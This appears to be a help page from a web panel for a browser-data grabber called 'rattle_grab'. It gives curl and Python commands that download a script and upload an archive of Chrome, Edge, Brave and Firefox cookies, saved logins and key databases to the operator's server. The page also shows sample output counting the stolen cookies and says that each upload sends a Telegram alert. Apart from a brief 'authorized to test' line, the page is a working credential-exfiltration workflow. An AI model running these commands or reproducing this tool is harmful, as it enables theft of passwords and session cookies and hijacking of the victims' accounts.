How to Collect Browser Data

Run the grabber on the windows machine you are authorized to test. It collects Chrome / Edge / Brave Local State + Cookies + Login Data, plus Firefox cookies.sqlite + logins.json + key4.db, zips them, and uploads here. It needs only Python 3 — no pip installs.

Step 1 — Get the script onto the machine
curl -o rattle_grab.py {{ request.host_url }}grab/download

(Or download it from this page manually and copy it over.)

Step 2 — Run it and upload directly
python rattle_grab.py --upload {{ upload_url }} --device my-laptop --key YOUR_KEY_IF_SET
Or run it and keep the zip locally
python rattle_grab.py --browsers chrome,firefox --out C:\Temp

Options: --browsers chrome,edge,brave,firefox (default all), --out FOLDER where the zip is written, --device LABEL friendly name shown in the Grabs page, --upload URL, --key KEY.

Expected output
[+] [chrome/Default] Cookies copied (sqlite-backup, 512 cookies)
[+] [chrome/Default] Login Data copied (copy)
[+] [chrome/Profile_1] Cookies copied (copy, 87 cookies)
[+] archive saved : C:\Temp\rattle_grab_20260101_120000.zip
[+] cookies found : 599
Where results appear

Uploaded archives show up on the Grabs page, trigger a Telegram alert, and are stored on the server volume under instance/grabs/.
